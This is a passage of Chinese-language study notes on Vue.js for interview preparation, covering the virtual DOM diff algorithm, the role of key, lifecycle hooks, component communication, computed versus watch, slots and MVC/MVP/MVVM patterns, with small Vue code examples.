Watcher，订阅者们就会调用  patch 方法，给真实 DOM 打补丁，更新相应的视图。</p><p><img src="https://i.loli.net/2021/10/27/a63sB5EAdQIKhgD.png" alt="image.png"></p><ol><li><p>patch 方法：对比当前同层的虚拟节点是否为同一种类型的标签。</p><ul><li><p>是：继续执行 patchVnode 方法进行深层比对</p></li><li><p>否：没必要比对，直接整个节点替换成新虚拟节点</p></li></ul></li><li><p>sameVnode 方法：判断是否为同一类型节点</p></li><li><p>patchVnode 方法：</p><ul><li>找到对应的真实 DOM，称为 el</li><li>判断<code>newVnode</code>和<code>oldVnode</code>是否指向同一个对象，如果是（没有变化）直接<code>return</code></li><li>如果他们都有文本节点并且不相等，那么将<code>el</code>的文本节点设置为<code>newVnode</code>的文本节点</li><li>如果<code>oldVnode</code>有子节点而<code>newVnode</code>没有，则删除<code>el</code>的子节点</li><li>如果<code>oldVnode</code>没有子节点而<code>newVnode</code>有，则将<code>newVnode</code>的子节点真实化之后添加到<code>el</code></li><li>如果两者都有子节点，则执行<code>updateChildren</code>函数比较子节点，<strong>这一步很重要</strong></li></ul></li><li><p>updateChildren 方法：新旧虚拟节点的子节点对比（首尾指针法）。新的子节点集合和旧的子节点集合，各有首尾两个指针。总共有五种比较情况：</p><ul><li><code>oldS 和 newS </code>使用<code>sameVnode方法</code>进行比较，<code>sameVnode(oldS, newS)</code></li><li><code>oldS 和 newE </code>使用<code>sameVnode方法</code>进行比较，<code>sameVnode(oldS, newE)</code></li><li><code>oldE 和 newS </code>使用<code>sameVnode方法</code>进行比较，<code>sameVnode(oldE, newS)</code></li><li><code>oldE 和 newE </code>使用<code>sameVnode方法</code>进行比较，<code>sameVnode(oldE, newE)</code></li><li>如果以上逻辑都匹配不到，再把所有旧子节点的 <code>key</code> 做一个映射到旧节点下标的 <code>key -&gt; index</code> 表，然后用新 <code>vnode</code> 的 <code>key</code> 去找出在旧节点中可以复用的位置。</li></ul></li></ol><p><strong>节点的插入删除移动的具体流程</strong>见4！</p><h3 id="diff-中-key-值的作用？"><a href="#diff-中-key-值的作用？" class="headerlink" title="diff 中 key 值的作用？"></a>diff 中 key 值的作用？</h3><p>如果用 index 做为 key，插入一个新数据：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>                      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;0&quot;</span>&gt;</span>a<span class="tag">&lt;/<span class="name">li</span>&gt;</span>        <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;0&quot;</span>&gt;</span>林三心<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span>b<span class="tag">&lt;/<span class="name">li</span>&gt;</span>        <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span>a<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span>c<span class="tag">&lt;/<span class="name">li</span>&gt;</span>        <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span>b<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                              <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span>c<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>                     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>理想结果：只插入一个li标签新节点，其他都不动，确保操作DOM效率最高。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">   &lt;li v-for=&quot;(item, index) in list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item.title &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;button @click=&quot;add&quot;&gt;增加&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">list: [</span><br><span class="line">    &#123; title: &quot;a&quot;, id: &quot;100&quot; &#125;,</span><br><span class="line">    &#123; title: &quot;b&quot;, id: &quot;101&quot; &#125;,</span><br><span class="line">    &#123; title: &quot;c&quot;, id: &quot;102&quot; &#125;,</span><br><span class="line">]</span><br><span class="line">      </span><br><span class="line">add() &#123;</span><br><span class="line">    this.list.unshift(&#123; title: &quot;林三心&quot;, id: &quot;99&quot; &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是结果是<strong>所有 li 标签都更新了</strong>。原因：在进行子节点的 diff 算法过程中，会<strong>先进行旧首节点和新首节点的sameNode 对比</strong>，这一步命中逻辑，因为现在新旧两次首部节点的 key 都是 0。同理 key 为 1 和 2  的也命中逻辑，导致相同 key 节点会进行 patchVnode 更新文本，而原本就有的 c 节点，却因为之前没有 key 为 4 的节点，而被当做新节点。使用 index 做 key，<strong>前三个都进行patchVnode更新文本，最后一个进行了新增节点</strong>。</p><p>解决方案：使用一个独一无二的值来当做 key。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的话，a，b，c 节点的 key 永远不变，所以就算进行了 patchVnode，也不会执行更新操作，节省了性能。而新增节点，由于更新前没有它的 key 所对应的节点，所以被当做新的节点，增加到真实DOM。</p><h2 id="vue-中-key-值的作用？（高频）"><a href="#vue-中-key-值的作用？（高频）" class="headerlink" title="vue 中 key 值的作用？（高频）"></a>vue 中 key 值的作用？（高频）</h2><ol><li>v-if 中使用 key：由于 Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。因此使用 v-if 实现元素切换时，如果切换前后含有相同类型的元素，那么这个元素就会被复用。如果是相同的 input 元素，那么切换前后用户的输入不会被清除掉，显然不符合需求。因此通过使用 key 来<strong>唯一标识一个元素</strong>，这样使用 key 的元素不会被复用。</li><li><strong>v-for 中使用 key</strong>：用 v-for 更新已渲染过的元素列表时，默认使用“就地复用”的策略。如果数据项的顺序发生了改变，Vue 不会移动 DOM 元素来匹配数据项的顺序，而是简单复用此处的每个元素。因此通过为每个列表项提供一个 key 值，使 Vue 跟踪元素的身份，从而高效的实现复用。这时 key 的作用是<strong>为了高效的更新渲染虚拟 DOM。</strong></li></ol><p><strong>深入讲讲：</strong></p><p>Vue 在 patch 过程中判断两个节点是否是相同节点，key 是一个必要条件。渲染一组列表时，key 往往是唯一标识。由于 Vue 判断两个节点是否相同时，主要判断两者的 key 和元素类型，如果不设置 key，值就是 undefined，则可能永远认为这是两个相同的节点，这导致了频繁更新元素，使得整个 patch 过程比较低效，影响性能。</p><h2 id="Vue-和-React-之间的区别（高频）"><a href="#Vue-和-React-之间的区别（高频）" class="headerlink" title="Vue 和 React 之间的区别（高频）"></a>Vue 和 React 之间的区别（高频）</h2><p><strong>相同点：</strong>围绕着数据流和组件化以及 diff 策略来答</p><ul><li>使用Virtual DOM，用 js 模拟 DOM 结构，提高重绘性能。支持数据驱动视图，不直接操作真实 dom</li><li>组件化开发，都支持 props 进行父子组件之间的数据通信</li><li>将注意力集中保持在核心库，而将其他功能如路由和全局状态管理交给相关的库（redux， Vuex）。</li><li>都支持服务器端的渲染</li><li>都支持 native 方案，React 的 react native，Vue 的 WEEX</li></ul><p><strong>异同点：</strong>围绕着更新的触发方式，以及异步和同步的渲染过程来答</p><ul><li>Vue 的表单可以使用 v-model 支持<strong>双向绑定</strong>，而 React 的数据流动是<strong>单向</strong>的。当然 v-model 是语法糖，本质上和 React 写表单的方式没区别。</li><li><strong>改变数据方式</strong>不同，Vue 修改状态只需要通过 this 的某种方式去更新 state 中的数据，而 React 需要使用 <code>setState</code> 来改变状态。并且 Vue 的底层使用了依赖追踪，页面更新渲染已经是最优，但是 React 还是需要用户手动去优化这方面的问题。</li><li>React 需要使用 <strong>JSX</strong>（JSX 是使用 XML 语法编写 JavaScript 的一种语法糖），有一定上手成本，并且需要一整套工具链支持，但是完全可以通过 JS 来控制页面，更加灵活。Vue 使用了<strong>模板语法</strong>，相比于 JSX 来说没有那么灵活，但是可以脱离工具链，通过直接编写 <code>render</code> 函数就能在浏览器中运行。</li><li>React 的思想很棒，各种抽象和模式使得代码更加美观。</li></ul><p>更多可以参考<a href="https://juejin.cn/post/6847009771355127822#heading-46">你不知道的React 和 Vue 的20个区别</a>。</p><h3 id="vue-和-react-的渲染差异？（todo）"><a href="#vue-和-react-的渲染差异？（todo）" class="headerlink" title="vue 和 react 的渲染差异？（todo）"></a>vue 和 react 的渲染差异？（todo）</h3><h3 id="diff-算法区别？（高频）"><a href="#diff-算法区别？（高频）" class="headerlink" title="diff 算法区别？（高频）"></a>diff 算法区别？（高频）</h3><p>参考自 <a href="https://cxyzjd.com/article/qq_45932447/110001564">https://cxyzjd.com/article/qq_45932447/110001564</a></p><p><strong><a href="https://juejin.cn/post/6919376064833667080">=&gt;react、vue2、vue3 的 diff 算法区别（good！）</a></strong></p><p>vue 和 react 的 diff 算法，都是忽略跨级比较，只做同级比较，复杂度都为 O(n)。vue diff 时调动 patch 函数。react 的思路是递增法：通过对比新列表中的节点，在原本的列表中的位置是否递增，来判断当前节点是否需要移动。</p><ol><li>vue 列表比对，采用<strong>从两端到中间的比对方式</strong>，而 react 则采用<strong>从左到右依次比对的方式</strong>。当一个集合只是把最后一个节点移动到了第一个，react 会把前面的节点依次移动，而 vue 只会把最后一个节点移动到第一个。</li><li>vue 比对节点，当<strong>节点元素类型相同，但是 className 不同</strong>，认为是不同类型元素，删除重建；而 react 会认为是同类型节点，只是修改节点属性。</li></ol><p>总体上，vue 的对比方式更高效。</p><h3 id="jQuery-与-vue-区别"><a href="#jQuery-与-vue-区别" class="headerlink" title="jQuery 与 vue 区别"></a>jQuery 与 vue 区别</h3><ol><li>jQuery 使用选择器选取 DOM 对象，对其进行赋值、取值、事件绑定等操作，和原生 HTML 区别只在于可以更方便的选取和操作 DOM 对象，数据和界面还是在一起的。比如需要获取 label 标签的内容：<code>(“lable”).val(); </code> 还是依赖DOM元素的值。</li><li>Vue 则是通过 Vue 对象将数据和 View 完全分离。对数据进行操作不再需要引用相应的 DOM 对象。</li></ol><p>Vue 优点：</p><ul><li>数据的自动绑定</li><li>页面参数传递和页面状态管理。</li><li>模块化开发、无刷新保留场景参数更新</li><li>代码的可阅读性（模块化开发带来的）</li><li>基于强大的nodejs，拥有npm包管理器，可以很好滴管理包的版本</li><li>各子组件样式不冲突</li><li>视图,数据,结构分离</li><li>虚拟dom</li><li>各种指令;过滤器</li></ul><h2 id="Vue-的生命周期是什么？"><a href="#Vue-的生命周期是什么？" class="headerlink" title="Vue 的生命周期是什么？"></a>Vue 的生命周期是什么？</h2><p>Vue 的生命周期指的是组件从创建到销毁的一系列的过程。</p><h3 id="各个生命阶段？（高频）"><a href="#各个生命阶段？（高频）" class="headerlink" title="各个生命阶段？（高频）"></a>各个生命阶段？（高频）</h3><p>Vue 一共有8个生命阶段，分别是创建前、创建后、加载前、加载后、更新前、更新后、销毁前和销毁后，每个阶段对应了一个生命周期的钩子函数。<img src="https://i.loli.net/2021/10/17/8VDnJaCiH5A9vyZ.png" alt="12602393-5310c1449192165f.jpg"></p><p>（1）beforeCreate：在实例初始化之后，在数据监听和事件配置之前触发。因此在这个事件中获取不到 props 或者 data 数据。</p><p>（2）created：在<strong>实例创建完成后</strong>触发，此时可以<strong>访问 data、methods 等属性</strong>。但组件还没有被挂载到页面中去，所以<strong>访问不到 $el 属性</strong>。一般可以在这个函数中<strong>进行一些页面初始化的工作</strong>，比如通过 ajax 请求数据来对页面进行初始化。</p><p>（3）beforeMount：在组件被挂载到页面之前触发。在 beforeMount 之前，会找到对应的 template，并编译成 render 函数。</p><p>（4）mounted：在<strong>组件挂载到页面后</strong>触发。此时可以<strong>获取页面中的 DOM 元素</strong>。</p><p>（5）beforeUpdate：在响应式数据更新时触发，发生在虚拟 DOM 重新渲染和打补丁之前，这个时候可以对可能会被移除的元素做一些操作，比如<strong>移除事件监听器</strong>。</p><p>（6）updated：虚拟 DOM 重新渲染和打补丁之后调用。</p><p>（7）beforeDestroy：在实例销毁之前调用。在这一步可以<strong>销毁定时器、解绑全局事件</strong>等。</p><p>（8）destroyed：在实例销毁之后调用。调用后，Vue 实例中的所有东西都会解除绑定，<strong>所有的事件监听器会被移除</strong>，所有的子实例也会被销毁。</p><p>当使用 keep-alive 的时候，还有两个钩子函数，分别是 activated 和 deactivated 。</p><h3 id="keep-alive-组件作用？"><a href="#keep-alive-组件作用？" class="headerlink" title="keep-alive 组件作用？"></a>keep-alive 组件作用？</h3><p>如果需要<strong>在组件切换的时候，保存一些组件的状态防止多次渲染</strong>，就可以使用 keep-alive 组件包裹需要保存的组件。</p><p>对于 <code>keep-alive</code> 组件来说，它拥有两个独有的生命周期钩子函数，分别为 <code>activated</code> 和 <code>deactivated</code> 。用 keep-alive 包裹的组件在切换时不会进行销毁，当组件被换掉时，会被缓存到内存中、触发 deactivated 生命周期；当组件被切回来时，再去缓存里找这个组件、触发 activated钩子函数。</p><p>keep-alive有以下三个属性：</p><ul><li>include 字符串或正则表达式，只有名称匹配的组件会被匹配；</li><li>exclude 字符串或正则表达式，任何名称匹配的组件都不会被缓存；</li><li>max 数字，最多可以缓存多少组件实例。</li></ul><h3 id="在哪个生命周期请求异步数据、绑定事件、取消事件？"><a href="#在哪个生命周期请求异步数据、绑定事件、取消事件？" class="headerlink" title="在哪个生命周期请求异步数据、绑定事件、取消事件？"></a>在哪个生命周期请求异步数据、绑定事件、取消事件？</h3><p>可以在钩子函数 created、beforeMount、mounted 中进行调用，因为在这三个钩子函数中，data 已经创建，可以将服务端端返回的数据进行赋值。</p><p>推荐在 created 钩子函数中调用异步请求，因为在 created 钩子函数中调用异步请求有以下优点：</p><ul><li>能更快获取到服务端数据，减少页面加载时间，用户体验更好；</li><li>SSR不支持 beforeMount 、mounted 钩子函数，放在 created 中有助于一致性。</li></ul><h3 id="父子组件的生命周期顺序？"><a href="#父子组件的生命周期顺序？" class="headerlink" title="父子组件的生命周期顺序？"></a>父子组件的生命周期顺序？</h3><p>参考自<a href="https://blog.csdn.net/qq_42072086/article/details/108385632">https://blog.csdn.net/qq_42072086/article/details/108385632</a></p><p>父子组件的<strong>加载渲染过程顺序</strong>为：（当dom渲染时，会创建元素，然后进行初始化，初始化组件的时候内部还有组件，会不停的去渲染，所以它的渲染顺序是先父后子，完成的顺序是先子后父。）</p><ul><li>父组件beforeCreated</li><li>父组件created </li><li>父组件beforeMounted </li><li>子组件beforeCreated </li><li>子组件created </li><li>子组件beforeMounted </li><li>子组件mounted </li><li><strong>父组件mounted</strong>（最后）</li></ul><p><strong>子组件更新过程</strong>：</p><ul><li>父beforeUpdate</li><li>子beforeUpdate</li><li>子updated</li><li>父updated</li></ul><p><strong>销毁过程</strong>：</p><ul><li>父beforeDestroy</li><li>子beforeDestroy</li><li>子destroyed</li><li>父destroyed</li></ul><h3 id="继承组件的生命周期顺序？"><a href="#继承组件的生命周期顺序？" class="headerlink" title="继承组件的生命周期顺序？"></a>继承组件的生命周期顺序？</h3><p>交替进行。</p><h2 id="Vue-组件间的参数传递方式？（高频）"><a href="#Vue-组件间的参数传递方式？（高频）" class="headerlink" title="Vue 组件间的参数传递方式？（高频）"></a>Vue 组件间的参数传递方式？（高频）</h2><h3 id="父子组件通信"><a href="#父子组件通信" class="headerlink" title="父子组件通信"></a>父子组件通信</h3><ol><li><p><strong>props / $emit</strong>：<code>props</code>只能是父组件向子组件进行传值，然后父组件在子组件上通过<code>v-on</code>注册监听事件，子组件通过 $emit 触发事件向父组件发送数据。这是典型的<strong>单向数据流</strong>，子组件不能直接修改 props， 而是必须通过发送事件的方式告知父组件修改数据。</p></li><li><p><strong>ref / $refs</strong>：通过 ref 属性给子组件设置一个名字。父组件通过 $refs 组件名来获得子组件，子组件通过 $parent 获得父组件，实现通信。（可以使用<code>$root</code>来访问根组件的实例）</p></li><li><p><strong>provider/inject</strong>：在父组件中通过 provider 提供变量，在子组件中通过 inject 将变量注入到组件中。不论子组件有多深，只要调用 inject，就可以注入 provider 中的数据。</p></li></ol><h3 id="兄弟组件通信"><a href="#兄弟组件通信" class="headerlink" title="兄弟组件通信"></a>兄弟组件通信</h3><ol><li> eventBus 事件总线（<code>$emit / $on</code>）：，本质是通过<strong>创建一个空的 Vue 实例作为消息传递的对象</strong>，通信的组件引入这个实例，通过在实例上监听和触发事件实现消息的传递。<strong>缺点</strong>：如果项目过大，使用这种方式进行通信，后期维护起来会很困难。</li></ol>   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// event-bus.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> EventBus = <span class="keyword">new</span> Vue()</span><br><span class="line"><span class="comment">// 发送 firstComponent.vue</span></span><br><span class="line">EventBus.$emit(<span class="string">&#x27;addition&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">num</span>:<span class="built_in">this</span>.num++</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 接收 secondComponent.vue</span></span><br><span class="line">EventBus.$on(<span class="string">&#x27;addition&#x27;</span>, <span class="function"><span class="params">param</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.count = <span class="built_in">this</span>.count + param.num;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>$parent / $children</strong>：通过查找父组件中的子组件来获取到兄弟组件<code>this.$parent.$children</code>，在 <code>$children</code> 中可以通过组件 <code>name</code> 查询到需要的组件实例，然后进行通信。注意：拿到的是所有子组件的实例，是一个数组，并且是无序，访问的数据也不是响应式的。（在根组件<code>#app</code>上拿<code>$parent</code>得到的是<code>new Vue()</code>的实例，在这实例上再拿<code>$parent</code>得到的是<code>undefined</code>，而在最底层的子组件拿<code>$children</code>是个空数组）</li></ol><h3 id="跨多层次组件通信"><a href="#跨多层次组件通信" class="headerlink" title="跨多层次组件通信"></a>跨多层次组件通信</h3><ol><li><p>Vue中的<strong>依赖注入</strong>（<code>provide / inject</code>）：注意，依赖注入所提供的属性是<strong>非响应式</strong>的。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 爷组件 A</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">provide</span>: &#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 孙组件 B</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">inject</span>: [<span class="string">&#x27;data&#x27;</span>],</span><br><span class="line">  <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 无论跨几层都能获得父组件的 data 属性</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.data) <span class="comment">// =&gt; 1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>**<code>$sttr / $listeners</code>**：</p><ul><li><code>$attrs</code>：继承所有的父组件属性（除了prop传递的属性、class 和 style ），一般用在子组件的子元素上</li><li><code>$listeners</code>：是一个对象，里面包含了作用在这个组件上的所有监听器，可以配合 <code>v-on=&quot;$listeners&quot;</code> 将所有的事件监听器指向这个组件的某个特定的子元素。（相当于子组件继承父组件的事件）</li></ul></li></ol><h3 id="任意组件通信"><a href="#任意组件通信" class="headerlink" title="任意组件通信"></a>任意组件通信</h3><ul><li>Event Bus ，其实就是创建一个事件中心，用它来传递事件和接收事件。</li><li>Vuex。如果业务逻辑复杂，很多组件之间需要同时处理一些公共的数据，这个时候采用上面方法就不利于项目的维护。Vuex 的思想就是<strong>将公共数据抽离，作为全局的变量管理</strong>，然后其他组件就可以对公共数据进行读写操作，达到解耦目的。</li></ul><h3 id="单向数据流"><a href="#单向数据流" class="headerlink" title="单向数据流"></a>单向数据流</h3><p>所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样为了防止子组件意外改变父级组件的状态。</p><p>每次父级组件发生更新时，子组件中所有的 prop 都将会刷新为最新的值。这意味着不应该在一个子组件内部改变 prop。</p><p>简单的单向数据流是指用户访问 View，View 发出用户交互的 Action，在 Action 里对 state 进行相应更新。state 更新后会触发 View 更新页面的过程。这样数据总是清晰的单向进行流动，便于维护并且可以预测。</p><h2 id="computed-和-watch-的区别？（高频）"><a href="#computed-和-watch-的区别？（高频）" class="headerlink" title="computed 和 watch 的区别？（高频）"></a>computed 和 watch 的区别？（高频）</h2><p>参考自<a href="https://www.codenong.com/cs105783438/">https://www.codenong.com/cs105783438/</a></p><p>（1）computed 是计算一个新的属性（但是<strong>依赖其他属性</strong>），并将该属性挂载到 Vue 实例上，watch 是<strong>监听已经存在且已挂载到 Vue 实例上的数据</strong>，所以用 watch 同样可以监听 computed 计算属性的变化。（computed &lt; watch）</p><p>（2）computed 具有<strong>缓存性</strong>，只有当依赖变化后，访问 computed 属性，才会计算新的值（减少模板中计算逻辑）。而 watch 则是<strong>当数据发生变化便会调用执行函数</strong>，在回调中可以执行任何逻辑，如函数节流，Ajax 异步获取数据，甚至操作 DOM。</p><p>（3）computed 不支持异步，当Computed中有异步操作时，无法监听数据的变化；watch 支持异步监听。</p><p>（4）使用场景：当需要进行数值计算，并且依赖于其它数据时使用 computed（利用缓存特性，避免重新计算），对于监听到值的变化需要做复杂业务逻辑的情况可以使用 watch。</p><p>能用 computed 的尽量用 computed。</p><h3 id="两者实现计算"><a href="#两者实现计算" class="headerlink" title="两者实现计算"></a>两者实现计算</h3><p>做一个加法运算，对输入 a，输入 b 执行加法，并显示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el: &#x27;#app&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: 2</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    add: function () &#123;</span><br><span class="line">      return this.a + this.b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  // computed 和 methods 其实类似，但是可以有 getter、setter</span><br><span class="line">  computed: &#123;</span><br><span class="line">    returnAdd: function () &#123;</span><br><span class="line">      // return this.a + this.b;</span><br><span class="line">  // getter</span><br><span class="line">      get: function() &#123;</span><br><span class="line">          this.sumAB_getter = this.a + this.b;</span><br><span class="line">          return this.a + this.b;</span><br><span class="line">      &#125;,</span><br><span class="line">      // setter</span><br><span class="line">      set: function(newVal) &#123;</span><br><span class="line">          console.log(&#x27;returnAdd-setter:&#x27; + newVal);</span><br><span class="line">          this.sumAB_setter = newVal;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    a: function(n, o)&#123;</span><br><span class="line">        this.sumAB_watch = n + this.b;</span><br><span class="line">        console.log(&#x27;a-newValue:&#x27; + n, &#x27;a-oldValue:&#x27; + o, &#x27;sumAB_watch:&#x27; + this.sumAB_watch);</span><br><span class="line">    &#125;,</span><br><span class="line">    b: function(n, o)&#123;</span><br><span class="line">        this.sumAB_watch = this.a + n;</span><br><span class="line">        console.log(&#x27;b-newValue:&#x27; + n, &#x27;b-oldValue:&#x27; + o, &#x27;sumAB_watch:&#x27; + this.sumAB_watch);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="实现一个可复用的-tab-组件？"><a href="#实现一个可复用的-tab-组件？" class="headerlink" title="实现一个可复用的 tab 组件？"></a>实现一个可复用的 tab 组件？</h2><p><a href="https://codesandbox.io/s/github/vuejs/vuejs.org/tree/master/src/v2/examples/vue-20-dynamic-components?file=/index.html">https://codesandbox.io/s/github/vuejs/vuejs.org/tree/master/src/v2/examples/vue-20-dynamic-components?file=/index.html</a> </p><h2 id="slot-与-scope-slot？"><a href="#slot-与-scope-slot？" class="headerlink" title="slot 与  scope-slot？"></a>slot 与  scope-slot？</h2><p>slot 又名插槽，是 Vue 的内容分发机制，组件内部的模板引擎使用slot元素作为承载分发内容的出口。插槽slot是子组件的一个模板标签元素，而这一个标签元素是否显示，以及怎么显示是由父组件决定的。slot又分三类，<strong>默认插槽（匿名插槽）</strong>，<strong>具名插槽</strong>和<strong>作用域插槽</strong>。</p><p>作用域插槽：不同点是在子组件渲染作用域插槽时，可以将子组件内部的数据传递给父组件，让父组件根据子组件的传递过来的数据决定如何渲染该插槽。</p><p><strong>实现原理</strong>：当子组件vm实例化时，获取到父组件传入的slot标签的内容，存放在<code>vm.$slot</code>中，默认插槽为<code>vm.$slot.default</code>，具名插槽为<code>vm.$slot.xxx</code>。当组件执行渲染函数遇到slot标签时，会使用<code>$slot</code>中的内容进行替换，此时可以为插槽传递数据，若存在数据，则可称该插槽为作用域插槽。</p><h2 id="纯函数和副作用"><a href="#纯函数和副作用" class="headerlink" title="纯函数和副作用"></a>纯函数和副作用</h2><p>参考自 <a href="https://github.com/zachrey/zblog/issues/3">https://github.com/zachrey/zblog/issues/3</a></p><p><strong>函数副作用</strong>：当调用函数时，除了返回函数值之外，还对主调用函数产生附加的影响。例如修改全局变量（函数外的变量）或修改参数。</p><p><strong>无副作用 &amp; 纯函数：</strong></p><ol><li>函数与外界的只有唯一一个渠道进行沟通，通过传入参数和返回值进行沟通。</li><li>相同的传入参数永远只会有相同的返回值。</li></ol><p>最简单的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="什么是-MVVM？比之-MVC-有什么区别？什么是-MVP（高频）"><a href="#什么是-MVVM？比之-MVC-有什么区别？什么是-MVP（高频）" class="headerlink" title="什么是 MVVM？比之 MVC 有什么区别？什么是 MVP（高频）"></a>什么是 MVVM？比之 MVC 有什么区别？什么是 MVP（高频）</h2><p>View 和 Model：</p><ul><li>View 用户看到的视图</li><li>Model 本地数据和数据库中的数据</li></ul><p>MVC 架构通常是<strong>使用控制器更新模型，视图从模型中获取数据去渲染</strong>。View 负责页面的显示逻辑，Model 负责存储页面的业务数据，以及对相应数据的操作。View 和 Model 应用了观察者模式，当 Model 层发生改变的时候它会通知有关 View 层更新页面。Controller 层是 View 层和 Model 层的纽带，它主要负责用户与应用的响应操作，当用户与页面产生交互的时候，Controller 中的事件触发器就开始工作，通过调用 Model 层来完成对 Model 的修改，然后 Model 层再去通知 View 层更新。</p><p><img src="https://i.loli.net/2021/09/11/lahWzk4gVPcbs7U.png" alt="image.png"></p><p>但是 MVC 一个巨大的缺陷就是<strong>控制器承担的责任太大</strong>了，随着项目愈加复杂，控制器中的代码会越来越<strong>臃肿</strong>，导致出现不利于<strong>维护</strong>的情况。</p><p>**MVP **：与 MVC 唯一不同的在于 Presenter 和 Controller。在 MVC 模式中 View 层和 Model 层耦合在一起，当项目逻辑变得复杂的时候，可能会造成代码的混乱，并且可能会对代码的复用性造成一些问题。MVP 的模式通过使用 Presenter 来实现对 View 层和 Model 层的解耦：MVC 中的 Controller 只知道 Model 的接口，因此没有办法控制 View 层的更新，MVP 模式中，View 层的接口暴露给了 Presenter，因此可以在 Presenter 中将 Model 的变化和 View 的变化绑定在一起，以此来实现 View 和 Model 的同步更新。</p><p><strong>MVVM</strong>：与 MVP 思想相同，通<strong>过双向数据绑定将 View 和 Model 的同步更新给自动化</strong>了。<strong>ViewModel 只关心数据和业务的处理，不关心 View 如何处理数据</strong>。这样还可以将一些可复用的逻辑放在一个 ViewModel 中，让多个 View 复用这个 ViewModel。以 Vue 框架来举例，<strong>ViewModel 就是组件的实例</strong>。View 就是模板，Model 的话在引入 Vuex 的情况下是完全可以和组件分离的。</p><p><img src="https://i.loli.net/2021/09/11/aFJGPc8H3E6pRrg.png" alt="image.png"></p><p>除了以上三个部分，其实在 MVVM 中还引入了一个隐式的 Binder 层，实现了 View 和 ViewModel 的绑定。这个隐式的 Binder 层就是 Vue 通过解析模板中的插值和指令从而实现 View 与 ViewModel 的绑定。</p><p><img src="https://i.loli.net/2021/09/11/UDACQIv2rqnBNhW.png" alt="image.png"></p><p>对于 MVVM 来说，最重要的并不是通过双向绑定或者其他的方式将 View 与 ViewModel 绑定起来，而是<strong>通过 ViewModel 将视图中的状态和用户的行为分离出一个抽象</strong>。</p><h3 id="实现一个简单的-MVVM-框架（to-understand）"><a href="#实现一个简单的-MVVM-框架（to-understand）" class="headerlink" title="*实现一个简单的 MVVM 框架（to understand）"></a>*实现一个简单的 